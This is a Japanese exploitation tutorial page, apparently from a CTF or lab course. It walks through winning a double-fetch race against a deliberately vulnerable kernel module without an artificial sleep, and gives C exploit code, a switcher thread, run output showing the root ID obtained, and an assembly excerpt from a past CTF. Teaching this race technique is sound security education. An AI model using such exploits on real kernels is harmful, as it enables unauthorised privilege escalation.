---
description: 人為的なスリープを取り除く
---

# Double-Fetch without Sleep

## 概要

現実には、レースコンディションを起こすための 1 秒間のスリープはありません。つまり、2 つのデリファレンスの間にあるアセンブリ命令の合間で競合が起きることを期待するしかありません。

毎回成功するわけではなく、むしろ失敗する可能性のほうがかなり高いです。そこで、ループを **2 つ** 用意します。1 つは ID に `0` を書き続けるもの、もう 1 つは別の値(例えば `900`)を設定して `write` を呼び続けるものです。目標は、`0` に切り替えるスレッドのタイミングがぴったり合い、切り替えが ID チェックと ID の「代入」の間に入ることです。

{% file src="../../../.gitbook/assets/double_fetch_no_sleep.zip" %}

## 解析

ソースを確認すると、`msleep` がなくなっていることが分かります。

```c
if (creds->id == 0) {
    printk(KERN_ALERT "[Double-Fetch] Attempted to log in as root!");
    return -1;
}

printk("[Double-Fetch] Attempting login...");

if (!strcmp(creds->password, PASSWORD)) {
    id = creds->id;
    printk(KERN_INFO "[Double-Fetch] Password correct! ID set to %d", id);
    return id;
}
```

## エクスプロイト

今回のエクスプロイトは少し違った形になります。まず `Credentials` 構造体をもう一度作り、ID を `900` に設定します。

```c
Credentials creds;
creds.id = 900;
strcpy(creds.password, "p4ssw0rd");
```

次に、この構造体をモジュールに繰り返し書き込みます。確実に終了するよう、1,000,000 回(実質的には無限)ループさせます。

```c
// don't want to make the loop infinite, just in case
for (int i = 0; i < 1000000; i++) {
    // now we write the cred struct to the module
    res_id = write(fd, &creds, 0);

    // if res_id is 0, stop the race
    if (!res_id) {
        puts("[+] ID is 0!");
        break;
    }
}
```

返された ID が `0` なら、レースに勝ったことになります。「成功」の条件が正確には何なのか、それをどう確認できるのかを、常に意識しておくことがとても重要です。

2 つ目のスレッドでは、ID を `900` と `0` の間で延々と切り替え続けます。1 回目のデリファレンスで `900`、2 回目で `0` になることを期待するわけです。これはスレッドなので、ループは無限にしています。プログラムが終了すればスレッドも終了します(ただし `pthread_join()` は取り除いてください。そうしないと、メインスレッドが 2 つ目のスレッドの終了を永遠に待ち続けます)。

```c
void *switcher(void *arg) {
    volatile Credentials *creds = (volatile Credentials *)arg;

    while (1) {
        creds->id = 0;
        creds->id = 900;
    }
}
```

エクスプロイトをコンパイルして実行すると、期待どおりの結果が得られます。

```c
~ $ ./exploit 
FD: 3
[    2.140099] [Double-Fetch] Attempted to log in as root!
[    2.140099] [Double-Fetch] Attempted to log in as root!
[+] ID is 0!
[-] Finished race
```

なんて速いのでしょう。驚きです。2 回失敗しただけで成功しました。

### レースの解析

競合の窓がどれほど狭くても悪用できるのか、疑問に思うかもしれません。[TokyoWesterns CTF 2019 の `gnote`](https://rpis.ec/blog/tokyowesterns-2019-gnote/) では、競合の窓はアセンブリ命令 2 つぶんでした。

```
; note that rbx is the buf argument, user-controlled
cmp dword ptr [rbx], 5
ja default_case
mov eax, [rbx]
mov rax, jump_table[rax*8]
jmp rax
```

2 つの `[rbx]` のデリファレンスの間にある命令は 1 つだけですが、それでも競合を起こせます。これほど狭いのです。
